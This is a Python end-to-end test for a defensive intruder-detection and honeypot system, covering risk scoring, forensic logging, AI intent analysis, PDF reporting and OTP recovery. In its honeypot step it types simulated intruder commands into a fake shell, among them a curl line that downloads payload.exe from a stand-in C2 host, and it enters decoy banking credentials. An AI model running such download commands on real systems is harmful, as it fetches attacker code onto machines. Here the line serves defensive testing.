"""
End-to-End Validation: Telemetry Ingestion -> Risk Decision -> Honeypot Diversion ->
Forensic Trajectory Logging -> Offline AI Threat Intent Analysis -> Executive PDF Report Generation.
"""
import os
import sys
import time
import json

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from PyQt6.QtWidgets import QApplication

def run_end_to_end_validation():
    print("=" * 70)
    print("END-TO-END VALIDATION: FULL CONTINUOUS AUTHENTICATION & DFIR WORKFLOW")
    print("=" * 70)

    app = QApplication.instance()
    if app is None:
        app = QApplication(sys.argv)

    # 1. Initialize Core Components
    from telemetry.evaluator import ThreatEvaluator
    from deception.forensic_tracker import get_tracker
    from deception.honey_desktop import HoneyShell
    from deception.decoy_chrome import DecoyChrome
    from deception.ai_intent_analyzer import IntruderIntentAnalyzer
    from dashboard.pdf_generator import ForensicReportGenerator

    evaluator = ThreatEvaluator()
    tracker = get_tracker()
    tracker.reset_session()
    print("[STEP 1: INITIALIZATION] Evaluator, Tracker, and Deception Modules ready.")

    # 2. Stage 1: Legitimate Owner Baseline (Tier 1)
    print("\n--- [STEP 2] Simulating Legitimate Owner Baseline Operations ---")
    owner_rows = [
        {
            "timestamp": time.time() - 30,
            "hour_of_day": 14, "keystroke_count": 22,
            "dwell_mean": 0.088, "dwell_std": 0.012,
            "flight_mean": 0.135, "flight_std": 0.020,
            "app_dwell_mean": 0.088, "app_flight_mean": 0.135,
            "app_backspace_ratio": 0.08, "app_special_ratio": 0.22,
            "app_click_count": 3, "app_scroll_count": 5, "app_pause_ratio": 0.32,
            "interaction_mode": "code_writing_and_testing",
            "mouse_events": 40,
            "mouse_velocity_mean": 270.0, "mouse_acceleration_mean": 12.0,
            "mouse_jerk_mean": 1.1, "mouse_straightness_mean": 0.91,
            "active_app": "Code.exe", "active_window": "main.py - Visual Studio Code",
            "cpu_usage": 3.0, "ram_usage_mb": 290.0,
            "dwell_sequence": [0.088] * 30, "flight_sequence": [0.135] * 30,
            "ble_proximity_state": "IMMEDIATE", "owner_phone_present": True,
            "is_untrusted_network": False
        },
        {
            "timestamp": time.time() - 25,
            "hour_of_day": 14, "keystroke_count": 0,  # Reading docs
            "dwell_mean": 0.0, "dwell_std": 0.0,
            "flight_mean": 0.0, "flight_std": 0.0,
            "app_dwell_mean": 0.0, "app_flight_mean": 0.0,
            "app_backspace_ratio": 0.0, "app_special_ratio": 0.0,
            "app_click_count": 2, "app_scroll_count": 14, "app_pause_ratio": 0.80,
            "interaction_mode": "web_research_or_reading",
            "mouse_events": 55,
            "mouse_velocity_mean": 255.0, "mouse_acceleration_mean": 11.0,
            "mouse_jerk_mean": 1.0, "mouse_straightness_mean": 0.90,
            "active_app": "chrome.exe", "active_window": "Python Docs - Chrome",
            "cpu_usage": 3.5, "ram_usage_mb": 410.0,
            "dwell_sequence": [0.09] * 30, "flight_sequence": [0.14] * 30,
            "ble_proximity_state": "IMMEDIATE", "owner_phone_present": True,
            "is_untrusted_network": False
        }
    ]

    for idx, r in enumerate(owner_rows):
        f_risk, s_risk, alert = evaluator.evaluate_row(r)
        print(f"  Owner Frame #{idx+1}: Instant Risk = {f_risk:.4f} | Smoothed = {s_risk:.4f} | Alert = {alert}")
        assert f_risk < 0.40, f"Owner frame {idx+1} exceeded Tier 1"
        assert alert is False, "Owner must never trigger alert"

    print("  [PASS] Legitimate baseline evaluated at Tier 1 with zero disruptions.")

    # 3. Stage 2: Acute Intruder Takeover & Honeypot Diversion (Tier 3)
    print("\n--- [STEP 3] Simulating Imposter Takeover & Lockdown ---")
    imposter_row = {
        "timestamp": time.time(),
        "hour_of_day": 23, "keystroke_count": 40,
        "dwell_mean": 0.285, "dwell_std": 0.065,
        "flight_mean": 0.410, "flight_std": 0.090,
        "app_dwell_mean": 0.285, "app_flight_mean": 0.410,
        "app_backspace_ratio": 0.02, "app_special_ratio": 0.01,
        "app_click_count": 1, "app_scroll_count": 0, "app_pause_ratio": 0.02,
        "interaction_mode": "command_execution",
        "mouse_events": 15,
        "mouse_velocity_mean": 860.0, "mouse_acceleration_mean": 72.0,
        "mouse_jerk_mean": 12.5, "mouse_straightness_mean": 0.45,
        "active_app": "cmd.exe", "active_window": "cmd.exe - net localgroup administrators",
        "cpu_usage": 60.0, "ram_usage_mb": 680.0,
        "dwell_sequence": [0.285] * 30, "flight_sequence": [0.410] * 30,
        "ble_proximity_state": "OUT_OF_RANGE", "owner_phone_present": False,
        "is_untrusted_network": True
    }
    f_risk, s_risk, alert = evaluator.evaluate_row(imposter_row)
    print(f"  Imposter Frame: Instant Risk = {f_risk:.4f} | Smoothed = {s_risk:.4f} | Alert = {alert}")
    assert f_risk >= 0.75, "Imposter must trigger Tier 3 Risk"
    assert alert is True, "Imposter must trigger alert"
    assert evaluator.is_breached is True, "Evaluator must enter breach state"
    print("  [PASS] Acute breach detected! Workstation diverted to deceptive honeypot environment.")

    # 4. Stage 3: Honeypot Interaction Trajectory & Forensic Logging
    print("\n--- [STEP 4] Trapping Adversary Trajectory in Honeypot Sandbox ---")
    sandbox_dir = os.path.join(PROJECT_ROOT, "data", "test_e2e_sandbox")
    forensics_dir = os.path.join(PROJECT_ROOT, "data", "test_e2e_forensics")
    os.makedirs(sandbox_dir, exist_ok=True)
    os.makedirs(forensics_dir, exist_ok=True)

    # A. Execute Honeyshell commands
    shell = HoneyShell(sandbox_dir, forensics_dir)
    shell.input_field.setText("whoami")
    shell.process_command()

    shell.input_field.setText("netstat -ano")
    shell.process_command()

    shell.input_field.setText("curl http://malicious-c2.darknet/payload.exe -o payload.exe")
    shell.process_command()

    # B. Trigger Decoy Browser Canary Traps
    chrome = DecoyChrome()
    chrome.navigate_to_banking()
    chrome.bank_user_input.setText("corp_finance_lead")
    chrome.bank_pass_input.setText("CorporatePayroll$2026")
    chrome.bank_token_input.setText("884192")
    chrome.on_bank_login_submitted()

    chrome.navigate_to_aws()
    chrome.on_aws_keys_extracted()

    chrome.navigate_to_github()
    chrome.on_github_secrets_extracted()

    timeline = tracker.get_timeline()
    stats = tracker.get_summary_stats()
    print(f"  Captured {len(timeline)} discrete forensic events across Honeyshell & Decoy Web Portals.")
    assert len(timeline) >= 5, "Must capture at least 5 forensic events"
    print("  [PASS] Adversary actions quarantined and logged into persistent forensic database.")

    # 5. Stage 4: Offline AI Threat Intelligence & Intent Analysis
    print("\n--- [STEP 5] Running Offline AI Threat Intent Analyzer ---")
    ai_analyzer = IntruderIntentAnalyzer(timeout=15)
    threat_intel = ai_analyzer.analyze_session(timeline, stats)
    print(f"  AI Persona Classification: {threat_intel.get('attacker_persona')}")
    print(f"  Assessed Threat Level    : {threat_intel.get('threat_level')}")
    print(f"  Primary Strategic Intent : {threat_intel.get('primary_intent')[:100]}...")
    print(f"  MITRE ATT&CK Tactics     : {threat_intel.get('mitre_tactics')}")
    assert threat_intel.get("threat_level") in ["HIGH", "CRITICAL"], "Threat level must be HIGH or CRITICAL"
    print("  [PASS] Threat intelligence synthesized with evidence-backed grounding.")

    # 7. Stage 6: Executive Forensic PDF Report Generation
    print("\n--- [STEP 6] Synthesizing Multi-Page Forensic Incident PDF ---")
    pdf_gen = ForensicReportGenerator()
    pdf_output_path = pdf_gen.generate_report(ai_report=threat_intel)
    assert os.path.exists(pdf_output_path), f"PDF report missing at {pdf_output_path}"
    pdf_size = os.path.getsize(pdf_output_path)
    print(f"  Forensic PDF generated: '{pdf_output_path}' ({pdf_size:,} bytes).")
    assert pdf_size > 10000, "PDF size must exceed 10KB"
    print("  [PASS] Executive forensic PDF successfully compiled.")

    # 8. Stage 7: Authenticated Recovery & One-Time OTP Cleanup
    print("\n--- [STEP 7] Authenticated Recovery & One-Time OTP Invalidation ---")
    active_otp = evaluator._load_active_otp()
    assert active_otp is not None and len(active_otp) == 6, f"Active OTP must exist and be 6 digits, got {active_otp}"
    print(f"  Retrieved active session OTP: {active_otp[:2]}**** (CSPRNG 6-digit)")
    
    # Verify OTP and restore session
    verified = evaluator.verify_otp_and_reset(active_otp)
    assert verified is True, "Valid OTP must successfully reset evaluator"
    assert evaluator.is_breached is False, "Evaluator must exit breach state after OTP verification"
    assert len(evaluator.risk_history) == 0, "Temporal risk queue must be cleared after recovery"
    
    # Verify one-time use: Replay must fail
    replay_attempt = evaluator.verify_otp_and_reset(active_otp)
    assert replay_attempt is False, "OTP replay attack must be blocked after one-time use"
    
    otp_file = os.path.join(PROJECT_ROOT, "models", ".active_otp")
    assert not os.path.exists(otp_file), "Active OTP file must be purged from disk after recovery"
    print("  [PASS] Authenticated recovery verified. OTP single-use and disk purge confirmed.")

    # Cleanup temp dirs
    import shutil
    shutil.rmtree(sandbox_dir, ignore_errors=True)
    shutil.rmtree(forensics_dir, ignore_errors=True)

    print("\n" + "=" * 70)
    print("COMPLETE END-TO-END WORKFLOW VALIDATION PASSED 100%!")
    print("=" * 70)

if __name__ == "__main__":
    run_end_to_end_validation()
